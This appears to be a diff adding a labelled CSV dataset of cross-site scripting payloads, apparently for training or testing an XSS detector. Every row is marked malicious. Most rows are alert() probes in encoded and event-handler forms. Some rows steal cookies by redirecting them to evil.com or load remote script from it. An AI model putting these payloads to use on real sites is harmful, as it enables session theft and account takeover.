@@ -1,0 +1,6001 @@
+payload,label
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<video onloadstart=alert(1) src=x>,1
+<svg/onload=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+<a href='javascript:alert(1)'>click</a>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<svg/onload=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<a href='javascript:alert(1)'>click</a>,1
+<video onloadstart=alert(1) src=x>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>alert(document.cookie)</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script src='http://evil.com/xss.js'></script>,1
+<input onfocus=alert(1) autofocus>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(document.cookie)</script>,1
+<svg/onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>alert(document.cookie)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<svg/onload=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(document.cookie)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(document.cookie)</script>,1
+<script>alert(1)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<a href='javascript:alert(1)'>click</a>,1
+<details ontoggle=alert(1) open>,1
+<script>alert(document.cookie)</script>,1
+<body onload=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<select onchange=alert(1)><option>x</option></select>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>alert(document.cookie)</script>,1
+<svg/onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<details ontoggle=alert(1) open>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg/onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<svg/onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(1)</script>,1
+<img src=x onerror=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<svg/onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<body onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>alert(1)</script>,1
+<svg/onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<input onfocus=alert(1) autofocus>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg/onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<body onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<body onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<svg/onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<iframe src='javascript:alert(1)'>,1
+<body onload=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>alert(document.cookie)</script>,1
+<script>alert(1)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<svg/onload=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<video onloadstart=alert(1) src=x>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<details ontoggle=alert(1) open>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg/onload=alert(1)>,1
+<body onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg/onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(document.cookie)</script>,1
+<svg/onload=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script src='http://evil.com/xss.js'></script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<details ontoggle=alert(1) open>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<input onfocus=alert(1) autofocus>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<video onloadstart=alert(1) src=x>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>alert(document.cookie)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>alert(1)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg/onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(1)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<svg/onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>alert(1)</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>alert(document.cookie)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<details ontoggle=alert(1) open>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<input onfocus=alert(1) autofocus>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<select onchange=alert(1)><option>x</option></select>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(1)>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<svg/onload=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(1)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<a href='javascript:alert(1)'>click</a>,1
+<iframe src='javascript:alert(1)'>,1
+<script>alert(document.cookie)</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>alert(document.cookie)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<input onfocus=alert(1) autofocus>,1
+<input onfocus=alert(1) autofocus>,1
+<details ontoggle=alert(1) open>,1
+<script>alert(1)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<iframe src='javascript:alert(1)'>,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<body onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<iframe src='javascript:alert(1)'>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>alert(document.cookie)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<details ontoggle=alert(1) open>,1
+<a href='javascript:alert(1)'>click</a>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<details ontoggle=alert(1) open>,1
+<input onfocus=alert(1) autofocus>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<input onfocus=alert(1) autofocus>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script src='http://evil.com/xss.js'></script>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script src='http://evil.com/xss.js'></script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(document.cookie)</script>,1
+<svg/onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>alert(1)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(1)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<a href='javascript:alert(1)'>click</a>,1
+<details ontoggle=alert(1) open>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(1)</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<body onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<form action='javascript:alert(1)'><input type=submit>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<details ontoggle=alert(1) open>,1
+<script>alert(1)</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<body onload=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<iframe src='javascript:alert(1)'>,1
+<video onloadstart=alert(1) src=x>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<body onload=alert(1)>,1
+<body onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<video onloadstart=alert(1) src=x>,1
+<video onloadstart=alert(1) src=x>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<details ontoggle=alert(1) open>,1
+<video onloadstart=alert(1) src=x>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<iframe src='javascript:alert(1)'>,1
+<details ontoggle=alert(1) open>,1
+<video onloadstart=alert(1) src=x>,1
+<iframe src='javascript:alert(1)'>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<a href='javascript:alert(1)'>click</a>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<select onchange=alert(1)><option>x</option></select>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(document.cookie)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<details ontoggle=alert(1) open>,1
+<iframe src='javascript:alert(1)'>,1
+<script>alert(1)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script src='http://evil.com/xss.js'></script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script src='http://evil.com/xss.js'></script>,1
+<input onfocus=alert(1) autofocus>,1
+<svg/onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=alert(document.cookie)>,1
+<svg/onload=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg/onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<script>alert(document.cookie)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<body onload=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<iframe src='javascript:alert(1)'>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<video onloadstart=alert(1) src=x>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(1)</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<details ontoggle=alert(1) open>,1
+<script>alert(document.cookie)</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<details ontoggle=alert(1) open>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>alert(1)</script>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>alert(1)</script>,1
+<script>alert(1)</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<video onloadstart=alert(1) src=x>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(1)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<svg/onload=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=alert(document.cookie)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>alert(1)</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script src='http://evil.com/xss.js'></script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>alert(document.cookie)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<input onfocus=alert(1) autofocus>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<body onload=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<select onchange=alert(1)><option>x</option></select>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>alert(1)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<input onfocus=alert(1) autofocus>,1
+<input onfocus=alert(1) autofocus>,1
+<a href='javascript:alert(1)'>click</a>,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg/onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>alert(1)</script>,1
+<video onloadstart=alert(1) src=x>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<details ontoggle=alert(1) open>,1
+<input onfocus=alert(1) autofocus>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg/onload=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+<details ontoggle=alert(1) open>,1
+<input onfocus=alert(1) autofocus>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<a href='javascript:alert(1)'>click</a>,1
+<body onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<video onloadstart=alert(1) src=x>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=alert(1)>,1
+<script>alert(1)</script>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>alert(1)</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<iframe src='javascript:alert(1)'>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<input onfocus=alert(1) autofocus>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<a href='javascript:alert(1)'>click</a>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<details ontoggle=alert(1) open>,1
+<script src='http://evil.com/xss.js'></script>,1
+<details ontoggle=alert(1) open>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>alert(1)</script>,1
+<video onloadstart=alert(1) src=x>,1
+<body onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<body onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<script>alert(document.cookie)</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(document.cookie)</script>,1
+<script>alert(1)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<video onloadstart=alert(1) src=x>,1
+<input onfocus=alert(1) autofocus>,1
+<body onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(1)>,1
+<body onload=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>alert(1)</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg/onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<select onchange=alert(1)><option>x</option></select>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<select onchange=alert(1)><option>x</option></select>,1
+<details ontoggle=alert(1) open>,1
+<script>alert(1)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<body onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<form action='javascript:alert(1)'><input type=submit>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<video onloadstart=alert(1) src=x>,1
+<a href='javascript:alert(1)'>click</a>,1
+<body onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<details ontoggle=alert(1) open>,1
+<a href='javascript:alert(1)'>click</a>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<video onloadstart=alert(1) src=x>,1
+<body onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<iframe src='javascript:alert(1)'>,1
+<details ontoggle=alert(1) open>,1
+<iframe src='javascript:alert(1)'>,1
+<video onloadstart=alert(1) src=x>,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script src='http://evil.com/xss.js'></script>,1
+<iframe src='javascript:alert(1)'>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<video onloadstart=alert(1) src=x>,1
+<script>alert(document.cookie)</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script src='http://evil.com/xss.js'></script>,1
+<input onfocus=alert(1) autofocus>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(1)</script>,1
+<input onfocus=alert(1) autofocus>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<select onchange=alert(1)><option>x</option></select>,1
